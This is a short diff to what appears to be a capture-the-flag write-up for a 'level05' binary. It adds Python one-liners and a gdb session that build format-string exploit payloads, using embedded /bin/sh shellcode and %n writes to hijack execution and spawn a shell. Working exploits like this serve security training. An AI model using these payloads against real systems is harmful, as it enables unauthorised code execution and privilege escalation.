@@ -37,3 +37,10 @@ OFFSET   TYPE              VALUE
 ```
 (python -c "import struct; print('jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' + 'AAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%54676d' + '%21\$n' + '%10807d' + '%22\$n')")
 ```
+```
+(python2.7 -c "import struct; print('jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814\$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' + 'AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%54672d' + '%22\$n' + '%10807d' + '%23\$n')") | ./level05
+```
+<pre>
+env -i SHELLCODE="$SHELLCODE" SHELL=/bin/bash gdb ./level05
+(gdb) r < <(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%57205d' + '%11\$n' + '%8318d' + '%12\$n')"; cat)
+</pre>
